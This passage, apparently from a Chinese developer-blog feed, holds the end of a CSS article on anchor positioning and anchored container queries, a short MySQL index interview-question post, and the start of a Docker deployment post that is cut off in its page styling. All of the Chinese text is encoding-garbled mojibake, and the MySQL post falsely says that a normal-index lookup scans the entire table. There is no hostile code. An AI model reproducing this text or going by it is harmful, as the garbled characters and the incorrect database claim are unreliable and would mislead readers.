<p>2024å¹´çš„CSSå›é¡¾ä¸­ï¼Œä»‹ç»äº†CSSé”šç‚¹å®šä½-â€”â€” anchor positioning, å®ç°ç±»ä¼¼ Tooltipç»„ä»¶çš„æ•ˆæœï¼Œè®©ä¸€ä¸ªå¼¹å‡ºå±‚é”šå®šåˆ°ç›®æ ‡å…ƒç´ å‘¨å›´ï¼Œä¸”èƒ½è‡ªåŠ¨ç¿»è½¬åˆ°é€‚åˆä½ç½®ï¼Œé¿å…ä½¿ç”¨Javascriptã€‚ å®ƒçš„å…¼å®¹æ€§ï¼š chrome125+, safari26+, ff ä¸æ”¯æŒã€‚</p>
<p>ä¸‹é¢ä¾‹å­æ¼”ç¤ºäº†ï¼šCSSé”šç‚¹å®šä½ã€‚tooltipä¼šé”šå®šåœ¨buttonçš„ä¸Šä¸‹ï¼Œ å½“æ»šåŠ¨åˆ°è¾¹ç•Œæ—¶ï¼Œä¼šè‡ªåŠ¨ç¿»è½¬æ˜¾ç¤ºã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.my-button</span> {
  anchor-name: --my-btn-anchor; <span class="hljs-comment">/* å®šä¹‰ä¸€ä¸ªåä¸º --my-btn-anchor çš„é”šç‚¹ */</span>
}

<span class="hljs-selector-class">.my-tooltip</span> {
  <span class="hljs-attribute">position</span>: absolute; <span class="hljs-comment">/* æˆ– fixed */</span>
  <span class="hljs-attribute">position</span>-anchor: --my-btn-anchor; <span class="hljs-comment">/* å…³è”åˆ°ä¸Šé¢å®šä¹‰çš„é”šç‚¹ */</span>
  <span class="hljs-attribute">position</span>-area: bottom;
  <span class="hljs-attribute">position</span>-try-fallbacks: flip-block; 
}
</code></pre>
<p>æ€è€ƒä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœmy-tooltipå…ƒç´ æœ‰å°ä¸‰è§’æŒ‡ç¤ºæ–¹å‘ï¼Œé‚£ä¹ˆç®€å•çš„ç¿»è½¬åï¼Œå°ä¸‰è§’çš„ä½ç½®æ€ä¹ˆæ—‹è½¬å‘¢ï¼Ÿ
ç­”æ¡ˆæ˜¯ï¼šå®šä½å…ƒç´ æ— æ³•æ„è¯†ï¼ˆbe aware)çŠ¶æ€ï¼Œå°ä¸‰è§’æ–¹å‘ä¼šé”™è¯¯ã€‚</p>
<p>æ­¤é—®é¢˜çš„è§£å†³æ–¹æ¡ˆå³æœ¬æ¬¡æ–°å¢äº†<code>CSSé”šå®šå®¹å™¨æŸ¥è¯¢</code>èƒ½åŠ›ï¼Œå®ƒé€šè¿‡æŒ‡å®štooltipçš„ <code>container-type: anchored</code>, ç„¶åä½¿ç”¨<code>@container anchored</code> çš„æŸ¥è¯¢è¯­æ³•ï¼Œå°±è®©tooltipæŸ¥è¯¢åˆ°ï¼Œæ„è¯†åˆ°è‡ªèº«çš„ç¿»è½¬çŠ¶æ€ï¼ˆfallbacks çŠ¶æ€ï¼‰ã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.tooltip</span> {
  container-type: anchored;

  <span class="hljs-comment">/* é»˜è®¤åœ¨ä¸‹æ–¹ï¼Œ å°ä¸‰è§’å‘ä¸Šï¼Œä½ç½®åœ¨åº•éƒ¨ */</span>
  &amp;<span class="hljs-selector-pseudo">::before</span> {
    <span class="hljs-attribute">content</span>: <span class="hljs-string">'â–²'</span>;
    <span class="hljs-attribute">position</span>: absolute;
    <span class="hljs-attribute">bottom</span>: <span class="hljs-number">100%</span>;  
  }
}
<span class="hljs-comment">/** å½“å®¹å™¨æŸ¥è¯¢åˆ°é”šç‚¹å˜åŒ– */</span>
<span class="hljs-keyword">@container</span> anchored(<span class="hljs-attribute">fallback</span>: flip-block) {
  <span class="hljs-selector-class">.tooltip</span><span class="hljs-selector-pseudo">::before</span> {
    <span class="hljs-comment">/* å°ä¸‰è§’å‘ä¸‹ï¼Œå¹¶ç§»åˆ°åˆ°é¡¶éƒ¨ */</span>
    <span class="hljs-attribute">content</span>: <span class="hljs-string">'â–¼'</span>;
    <span class="hljs-attribute">bottom</span>: auto;
    <span class="hljs-attribute">top</span>: <span class="hljs-number">100%</span>;  
  }
}
</code></pre>
<p>è¦è®²æ˜ç™½é”šç‚¹å®šä½éœ€è¦å¾ˆå¤§ç¯‡å¹…ï¼Œä¸”è¯¥ç¤ºä¾‹å¤æ‚ï¼Œå¤§å®¶å¯ä»¥è½¬åˆ°å®˜ç½‘æŸ¥çœ‹ç¤ºä¾‹ã€‚ ç›®å‰ <code>container-type: anchored</code> çš„æ–‡æ¡£è¿MDNä¸Šéƒ½æ²¡æœ‰ï¼Œæ˜¯æ¯”è¾ƒæ–°çš„æ¦‚å¿µã€‚</p>
<p>container-typeæœ‰æ•ˆå€¼ï¼š</p>
<ul>
<li>normal: å…ƒç´ ä¸æ”¯æŒä»»ä½•æŸ¥è¯¢</li>
<li>size: æ”¯æŒ inline å’Œ block å…ƒç´ çš„å°ºå¯¸çš„é«˜åº¦å’Œå®½åº¦æŸ¥è¯¢</li>
<li>inline-size: ä»…æ”¯æŒ inline å…ƒç´ çš„å°ºå¯¸çš„å®½åº¦æŸ¥è¯¢</li>
<li>scroll-state: æ”¯æŒæ»šåŠ¨æ€çš„åç§»é‡å’Œæ˜¯å¦æ»šåŠ¨åˆ°åº•ç­‰æŸ¥è¯¢ï¼Œchrome 133+, ä½†ff,safariå‡ä¸æ”¯æŒ</li>
<li>anchored: é”šç‚¹æŸ¥è¯¢</li>
</ul>
<h3 data-id="heading-23">å…¼å®¹æ€§ï¼š</h3>
<p><code>container-type: anchored</code> æ”¯æŒ chrome 143+ ,ä½†ff,safariå‡ä¸æ”¯æŒğŸ˜­ï¼Œä¸”css ç‰¹æ€§æ— æ³•Polyfillã€‚</p>
<h2 data-id="heading-24">æ€»ç»“</h2>
<p>é€šè¿‡ä»¥ä¸Šç§ç§æ–°ç‰¹æ€§ï¼Œå¯ä»¥çœ‹å‡ºchrome ä¸ä»…å…³æ³¨ä½¿ç”¨ç”¨æˆ·ä½“éªŒï¼Œæ›´å…³æ³¨å¼€å‘è€…ä½“éªŒã€‚é€šè¿‡å¢åŠ ç±»ä¼¼commandå±æ€§,æˆ–è€…Light Dismissçš„é»˜è®¤è¡Œä¸ºï¼Œä»¥åŠæ»šåŠ¨å®¹å™¨ï¼Œæ»šåŠ¨å®¹å™¨ä¼ªå…ƒç´ ç­‰æŠ€å·§ï¼Œè®©è®¸å¤šåœºæ™¯éƒ½å¯ä»¥<code>æ— Javascriptå®ç°</code>äº†ã€‚ ä¸ä»…å¤§å¤§å‡å°‘å¼€å‘ä»£ç ï¼Œè¿˜æœ‰æå¼ºçš„DOMå¯è¯»æ€§ã€‚</p>
<p>æˆ‘ç›®å‰ä»äº‹äºç»„ä»¶åº“å¼€å‘ã€‚åœ¨ç»„ä»¶åº“çš„å¼€å‘æ—¶ï¼Œæ‰€é‡‡ç”¨çš„æŠ€æœ¯é€šå¸¸æ˜¯è½åäºæµè§ˆå™¨æœ€æ–°æŠ€æœ¯çš„ï¼Œç†ç”±å°±æ˜¯ä¸ºäº†å…¼å®¹ç”¨æˆ·æµè§ˆå™¨ã€‚æ¯”å¦‚ dialog å…ƒç´ å·²ç»æ˜¯å¹¿æ³›å…¼å®¹ï¼Œä½†ç›®å‰ä»æ²¡æœ‰è§åˆ°å“ªä¸ªç»„ä»¶åº“ä½¿ç”¨å®ƒã€‚é€šè¿‡è¿™æ¬¡æ¢³ç†æŠ€æœ¯ï¼Œæ„Ÿè§‰å€ŸåŠ© dialog ä»¥åŠ popover api å¯ä»¥æå¤§ç®€åŒ–ä»¥å¾€çš„ç»„ä»¶å¼€å‘ï¼Œè¯¸å¦‚ï¼šç›‘å¬æŒ‰é”®ï¼Œè®¡ç®—z-index,è®¡ç®—å¼¹å‡ºå±‚ä½ç½®ï¼Œç›‘å¬æ»šåŠ¨è¿›è¡Œä½ç½®è·Ÿéšç­‰ç­‰,è¿™äº›æ˜¯é—®é¢˜bugé›†ä¸­çˆ†å‘åŒºï¼Œç°åœ¨åŸºæœ¬éƒ½å¯ä»¥<code>æ— Jsä»£ç </code>çš„å®ç°äº†ã€‚</p>
<p>å¦å¤–ï¼Œå‰é¢çš„è¯¸å¤šæœªå¹¿æ³›å…¼å®¹çš„æŠ€æœ¯ï¼Œå¤§éƒ½æœ‰ç›¸åº”çš„Polyfillï¼Œå°¤å…¶æ˜¯å±æ€§ï¼Œå‡½æ•°å’Œäº‹ä»¶çš„PolyfillåŸºæœ¬éƒ½èƒ½æ‰¾åˆ°ã€‚CSSçš„æ–°ä¼ªç±»ï¼Œä¼ªå…ƒç´ è™½ç„¶å¾ˆéš¾æœ‰Polyfillï¼Œä½†å¯ä»¥ç”¨æ·»åŠ ç±»åçš„æ–¹æ¡ˆæ¥å…¼å®¹ï¼Œè¾…åŠ©ä»¥ä¸€äº›Jsäº‹ä»¶å°±å¯ä»¥å®ç°æŸç§ç¨‹åº¦ä¸Šçš„polyfillã€‚<a href="https://link.juejin.cn?target=https%3A%2F%2Foddbird.tech%2F" target="_blank" title="https://oddbird.tech/" ref="nofollow noopener noreferrer">oddbird.tech</a>æ˜¯ä¸€å®¶æœåŠ¡å…¬å¸ï¼Œå¾—åˆ°è¿‡Googleçš„èµåŠ©ï¼Œå®ƒä»¬ä¸€ç›´å…³æ³¨å¼€å‘<code>Popover API</code>å’Œ <code>Anchor positioning</code>çš„å…¼å®¹æ–¹æ¡ˆã€‚è¿™äº›æ–¹æ¡ˆéƒ½è®©æˆ‘ä»¬ä»¥åŠæ—©çš„ä½¿ç”¨æ–°æŠ€æœ¯è¿›è¡Œå¼€å‘ã€‚</p>
<p>å¦‚æœåªéœ€è¦æ”¯æŒæœ€æ–°çš„æµè§ˆå™¨ï¼Œå‰ç«¯çš„æ˜¥å¤©æ¥äº†ï¼</p>
<h2 data-id="heading-25">å…³äºOpenTiny</h2>
<p>æ¬¢è¿åŠ å…¥ OpenTiny å¼€æºç¤¾åŒºã€‚æ·»åŠ å¾®ä¿¡å°åŠ©æ‰‹ï¼šopentiny-official ä¸€èµ·å‚ä¸äº¤æµå‰ç«¯æŠ€æœ¯ï½</p>
<p>OpenTiny å®˜ç½‘ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fopentiny.design" target="_blank" title="https://opentiny.design" ref="nofollow noopener noreferrer">opentiny.design</a><br/>
OpenTiny ä»£ç ä»“åº“ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny" target="_blank" title="https://github.com/opentiny" ref="nofollow noopener noreferrer">github.com/opentiny</a><br/>
TinyVue æºç ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-vue" target="_blank" title="https://github.com/opentiny/tiny-vue" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a><br/>
TinyEngine æºç ï¼šâ€…<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fopentiny%2Ftiny-engine" target="_blank" title="https://github.com/opentiny/tiny-engine" ref="nofollow noopener noreferrer">github.com/opentiny/tiâ€¦</a><br/>
æ¬¢è¿è¿›å…¥ä»£ç ä»“åº“ StarğŸŒŸTinyEngineã€TinyVueã€TinyNGã€TinyCLIã€TinyEditor~
å¦‚æœä½ ä¹Ÿæƒ³è¦å…±å»ºï¼Œå¯ä»¥è¿›å…¥ä»£ç ä»“åº“ï¼Œæ‰¾åˆ° good first issue æ ‡ç­¾ï¼Œä¸€èµ·å‚ä¸å¼€æºè´¡çŒ®~</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[mysqlåŸºç¡€é¢è¯•é¢˜]]></title>    <link>https://juejin.cn/post/7589207843788079139</link>    <guid>https://juejin.cn/post/7589207843788079139</guid>    <pubDate>2025-12-30T03:23:05.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589207843788079139" data-draft-id="7589246131585024035" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="mysqlåŸºç¡€é¢è¯•é¢˜"/> <meta itemprop="keywords" content="MySQL"/> <meta itemprop="datePublished" content="2025-12-30T03:23:05.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å“ˆé‡Œè°¢é¡¿"/> <meta itemprop="url" content="https://juejin.cn/user/3678304397695056"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            mysqlåŸºç¡€é¢è¯•é¢˜
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3678304397695056/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å“ˆé‡Œè°¢é¡¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:23:05.000Z" title="Tue Dec 30 2025 03:23:05 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»1åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ€è¿‘å¯¹mysqlçš„åŸºç¡€çŸ¥è¯†å¾ˆæ„Ÿå…´è¶£ï¼Œæ‰€ä»¥å¸Œæœ›é€šè¿‡æŸ¥è¯¢ç½‘ç»œä¸Šçš„é¢è¯•é¢˜æ¥å·©å›ºä¸‹åŸºç¡€ï¼Œæ‰€ä»¥å¦‚ä¸‹</p>
<h2 data-id="heading-0">1 æ™®é€šç´¢å¼•è·Ÿå”¯ä¸€ç´¢å¼•åº”è¯¥å¦‚ä½•é€‰æ‹©</h2>
<p>åœ¨ MySQLï¼ˆInnoDBï¼‰é‡Œï¼Œâ€œæ™®é€šäºŒçº§ç´¢å¼•ï¼ˆKEYï¼‰â€å’Œâ€œå”¯ä¸€ç´¢å¼•ï¼ˆUNIQUE KEYï¼‰â€<strong>åœ¨å­˜å‚¨ç»“æ„ã€æŸ¥è¯¢æ€§èƒ½ä¸Šå‡ ä¹ä¸€æ¨¡ä¸€æ ·</strong>ï¼ŒçœŸæ­£çš„å·®å¼‚åªæœ‰ä¸‰ç‚¹ï¼š</p>
<ol>
<li>å”¯ä¸€ç´¢å¼•å¤šä¸€é“â€œå”¯ä¸€æ€§çº¦æŸâ€æ£€æŸ¥</li>
<li>å”¯ä¸€ç´¢å¼•å¯¹ä¼˜åŒ–å™¨çš„<strong>åŸºæ•°ä¼°è®¡æ›´å‡†</strong>ï¼ŒæŸäº›åœºæ™¯èƒ½æ‹¿åˆ°æ›´ä¼˜çš„æ‰§è¡Œè®¡åˆ’</li>
<li>å”¯ä¸€ç´¢å¼•ä¸èƒ½å­˜é‡å¤å€¼ï¼Œå› æ­¤<strong>æ’å…¥/æ›´æ–°</strong>æ—¶å¯èƒ½å¤šä¸€æ¬¡â€œå†²çªæ£€æµ‹â€å¾€è¿”</li>
</ol>
<ul>
<li>
<p>æŸ¥è¯¢</p>
<ul>
<li>å½“æ™®é€šç´¢å¼•ä¸ºæ¡ä»¶æ—¶æŸ¥è¯¢åˆ°æ•°æ®ä¼šä¸€ç›´æ‰«æ,ç›´åˆ°æ‰«å®Œæ•´å¼ è¡¨</li>
<li>å½“å”¯ä¸€ç´¢å¼•ä¸ºæŸ¥è¯¢æ¡ä»¶æ—¶,æŸ¥åˆ°è¯¥æ•°æ®ä¼šç›´æ¥è¿”å›,ä¸ä¼šç»§ç»­æ‰«è¡¨</li>
</ul>
</li>
<li>
<p>æ›´æ–°</p>
<ul>
<li>æ™®é€šç´¢å¼•ä¼šç›´æ¥å°†æ“ä½œæ›´æ–°åˆ° change buffer ä¸­,ç„¶åç»“æŸ</li>
<li>å”¯ä¸€ç´¢å¼•éœ€è¦åˆ¤æ–­æ•°æ®æ˜¯å¦å†²çª</li>
</ul>
</li>
</ul>
<p>æ‰€ä»¥**ã€Œå”¯ä¸€ç´¢å¼•æ›´åŠ é€‚åˆæŸ¥è¯¢çš„åœºæ™¯,æ™®é€šç´¢å¼•æ›´é€‚åˆæ’å…¥çš„åœºæ™¯ã€**</p>
<h2 data-id="heading-1">2 ä¸€æ¡sqlå‘½ä»¤ä¸€ç›´æŸ¥è¯¢æ…¢çš„åŸå› æ˜¯ä»€ä¹ˆ</h2>
<p><strong>ã€Œ1.æ²¡æœ‰ç”¨åˆ°ç´¢å¼•ã€</strong></p>
<ul>
<li>æ¯”å¦‚å‡½æ•°å¯¼è‡´çš„ç´¢å¼•å¤±æ•ˆï¼Œæˆ–è€…æœ¬èº«å°±æ²¡æœ‰åŠ ç´¢å¼•</li>
</ul>
<p><strong>ã€Œ2.è¡¨æ•°æ®é‡å¤ªå¤§ã€</strong></p>
<ul>
<li>è€ƒè™‘åˆ†åº“åˆ†è¡¨å§</li>
</ul>
<p><strong>ã€Œ3.ä¼˜åŒ–å™¨é€‰é”™äº†ç´¢å¼•ã€</strong></p>
<ul>
<li><strong>ã€Œè€ƒè™‘ä½¿ç”¨ã€</strong>Â force index å¼ºåˆ¶èµ°ç´¢å¼•</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[dockerå®‰è£…ä»¥åŠéƒ¨ç½²nodeé¡¹ç›®]]></title>    <link>https://juejin.cn/post/7589201772133498921</link>    <guid>https://juejin.cn/post/7589201772133498921</guid>    <pubDate>2025-12-30T03:27:37.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589201772133498921" data-draft-id="7589171972447387690" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="dockerå®‰è£…ä»¥åŠéƒ¨ç½²nodeé¡¹ç›®"/> <meta itemprop="keywords" content="Docker,å‰ç«¯,åç«¯"/> <meta itemprop="datePublished" content="2025-12-30T03:27:37.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æ—å¤ªç™½"/> <meta itemprop="url" content="https://juejin.cn/user/1874034273300919"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            dockerå®‰è£…ä»¥åŠéƒ¨ç½²nodeé¡¹ç›®
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1874034273300919/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æ—å¤ªç™½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-30T03:27:37.000Z" title="Tue Dec 30 2025 03:27:37 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body 